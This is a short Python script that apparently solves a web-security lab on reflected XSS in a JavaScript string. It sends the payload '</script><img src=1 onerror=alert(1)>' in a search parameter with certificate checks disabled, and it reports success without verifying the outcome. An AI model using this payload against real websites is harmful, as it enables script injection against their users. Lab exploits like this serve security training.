import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Reflected XSS into a JavaScript string with single quote and backslash escaped"

def run(url, payload, proxies=None):
    path = "?search="
    payload = "</script><img src=1 onerror=alert(1)>"
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        r = requests.get(url.rstrip('/'), verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False